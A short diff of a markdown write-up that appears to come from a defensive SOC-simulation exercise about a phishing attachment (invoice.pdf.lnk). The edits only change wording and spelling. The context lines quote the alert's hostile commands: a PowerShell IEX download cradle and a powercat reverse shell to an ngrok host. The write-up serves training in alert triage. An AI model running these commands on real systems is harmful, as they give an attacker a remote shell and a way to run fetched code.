@@ -23,7 +23,7 @@ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "IEX(New-Object Sy
 powercat -c 2.tcp.ngrok.io -p 19282 -e powershell
 ```
 
-I then triaged this low severity alert, classified it as a True Positive and escalated it to an imaginary Tier 2 Analyst (it is a simulation after all)
+I then triaged this low severity alert, classified it as a True Positive and escalated it to a 2 Analyst.
 
 ![invoice.pdf.lnk-findings](https://github.com/V4641/InfoSec-Portfolio/blob/main/Defensive/Soc-Simulator/THM%20Phishing%20Unfolding/Screenshots/Screenshot%202026-08-17%20205421.png)
 
@@ -41,7 +41,7 @@ The biggest takeaway, besides the experience of incoming live alerts, was that w
 
 Expanding this knowledge base is one of my primary concerns at the current time, to not be reliant on other sources as much as I did here.
 
-Another area to improve upon is the dashboard internal report-system. While I tried to include all necassery information I do not have the experience yet to create flawless report writeups while triaging multiple alerts.
+Another area to improve upon is the dashboard internal report-system. While I tried to include all necessery information I do not have the experience yet to create flawless report writeups while triaging multiple alerts.
 
 ## Conclusion
 
